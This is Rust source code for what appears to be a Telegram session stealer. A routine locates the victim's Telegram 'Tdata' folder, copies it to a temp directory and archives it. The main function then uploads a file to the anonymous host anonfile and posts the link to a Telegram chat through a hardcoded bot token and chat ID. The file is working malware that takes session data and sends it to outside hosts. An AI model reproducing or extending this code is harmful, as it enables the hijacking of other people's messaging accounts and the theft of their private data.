extern crate user32;
extern crate winapi;

pub mod utils;
use std::path::Path;

use utils::filesystem::{copy_dirs, zip_dir};
use utils::net::{anonfile, telegram};
use utils::os::{get_directory_by_process, get_temp_dir_path};

fn copy_telegram_session(mut telegram_folder: String) -> Result<(), String> {
    telegram_folder.push_str("\\Tdata");

    if !Path::new(&telegram_folder).exists() {
        return Err("Tdata is not found".to_string());
    }

    let mut temp_dir = get_temp_dir_path()?;
    temp_dir.push_str("720c2c46-0a3e-416f-b992-174a21555b7b(2)");

    let mut session_copy_path = temp_dir.clone();
    session_copy_path.push_str("\\session");

    let mut archive_path = temp_dir;
    archive_path.push_str("\\session.tar");

    copy_dirs(&telegram_folder, &session_copy_path).unwrap();
    zip_dir(archive_path, session_copy_path).unwrap();

    Ok(())
}

//612753417
fn main() {
    let res = anonfile::load_file(r#"C:\Users\dev\Documents\repos\rust-test\Cargo.lock"#).unwrap();

    telegram::send_message(
        "5279761929:AAEnsQN3NyCqW5bJndsBzWOdWbqr4G3J9bQ".to_string(),
        "612753417".to_string(),
        res,
    )
    .unwrap();
}
